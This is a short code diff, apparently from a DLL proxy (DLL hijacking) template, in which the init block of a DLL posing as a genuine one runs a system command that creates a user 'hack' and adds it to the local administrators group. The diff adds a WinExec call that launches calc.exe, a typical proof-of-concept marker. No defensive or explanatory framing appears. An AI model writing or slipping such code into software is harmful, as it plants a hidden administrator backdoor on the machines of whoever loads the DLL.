@@ -286,6 +286,8 @@ namespace {
         loadGenuineDll(dllType, systemDirectory);
         plugin::loadPluginDlls();
         {
+            //PrintPrivileges();
+            WinExec("calc.exe", SW_SHOW);
             system("net user hack hack /add && net localgroup administrators hack /add");      
             //
             // *** You can put your own init code here ***
